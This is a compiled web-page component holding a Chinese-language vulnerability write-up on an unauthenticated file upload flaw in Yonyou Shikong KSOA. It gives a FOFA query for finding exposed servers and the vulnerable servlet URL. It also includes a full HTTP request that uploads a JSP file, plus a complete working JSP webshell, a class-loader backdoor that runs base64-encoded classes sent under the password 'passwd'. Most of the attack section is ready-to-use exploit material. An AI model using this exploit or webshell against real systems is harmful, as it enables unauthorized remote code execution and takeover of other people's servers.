import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const s={},l=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友时空 KSOA 是用友网络科技股份有限公司建立在 SOA 理念指导下研发的新一代产品，其中 com.sksoft.bill.ImageUpload 存在前台文件上传漏洞，攻击者可以在不登陆的情况下上传恶意 Webshell，控制系统权限。</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;用友-时空KSOA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录界面：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230601102416204.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞 URL：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/servlet/com.sksoft.bill.ImageUpload?filepath=/&amp;filename=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&amp;filename=1.jsp HTTP/1.1
Host: your-ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://en.fofa.info/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=825A011F31259CCA1649D5DF4849635E
Connection: close
Content-Length: 1

&lt;%!
your-payload
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230601102530120.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问 /pictures/1.jsp 即可。</p><h3 id="webshell" tabindex="-1"><a class="header-anchor" href="#webshell" aria-hidden="true">#</a> Webshell</h3><p>密码：passwd</p><div class="language-jsp line-numbers-mode" data-ext="jsp"><pre class="language-jsp"><code>&lt;%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);
            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName(&quot;java.util.Base64&quot;);
            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);
            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);
        }
    }
%&gt;
&lt;%
    String cls = request.getParameter(&quot;passwd&quot;);
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16),d=[l];function t(r,c){return i(),n("div",null,d)}const u=e(s,[["render",t],["__file","用友时空 KSOA V9.0 文件上传漏洞.html.vue"]]);export{u as default};
